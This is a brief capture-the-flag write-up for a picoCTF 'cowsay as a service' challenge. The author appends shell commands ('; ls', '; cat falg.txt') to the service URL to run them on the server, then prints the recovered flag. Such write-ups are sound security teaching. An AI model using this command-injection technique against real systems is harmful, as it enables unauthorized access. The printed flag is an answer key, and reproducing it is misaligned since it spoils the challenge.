#I FIRST OPEN THE FILE AND READ THE SOURCE CODE THROUGH index.js
#THEN we are asked to make a request in the given url " https://caas.mars.picoctf.net/cowsay/%7Bmessage%7D "
# I use this link to open in new tab 
# then i use https://caas.mars.picoctf.net/cowsay/{message} ; ls 
# It gives me a set of file :
  Dockerfile
  falg.txt
  index.js
  node_modules
  package.json
  public
  yarn.lock

#it shows that linux commands can be used in this website, hence i then used " cat" to read into the falg,txt file

  https://caas.mars.picoctf.net/cowsay/{message} ; cat falg.txt
 
Now we get the required flag as :
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
